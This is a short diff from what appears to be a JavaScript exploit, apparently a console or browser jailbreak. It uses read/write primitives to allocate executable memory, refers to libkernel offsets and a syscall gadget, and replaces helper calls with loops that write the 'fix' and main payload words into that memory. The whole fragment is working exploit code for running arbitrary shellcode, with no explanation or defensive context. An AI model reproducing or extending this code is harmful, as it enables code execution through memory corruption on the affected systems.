@@ -581,8 +581,11 @@
         var objBaseStore = executeSegment.allocate(0x8);
         var shellcode = executeSegment.allocate(0x200);
 
+        // Write fix
         p.write8(objBaseStore, objBase);
-        writeFix(p, shellcode);
+        for (var i = 0; i < fix.length; i++) {
+            p.write4(shellcode.add32(i * 4), fix[i]);
+        }
 
         //print("Running fix payload...");
 
@@ -615,7 +618,9 @@
           p.call(libkernel.add32(0x130), code_addr, 0, 0x1FFFF8);
 
           // Write payload
-          writePayload(p, code_addr);
+          for (var i = 0; i < payload.length; i++) {
+              p.write4(code_addr.add32(i * 4), payload[i]);
+          }
 
           // Write syscall gadget
           p.write8(code_addr.add32(0x1FFFF8), libkernel.add32(0x29C7));
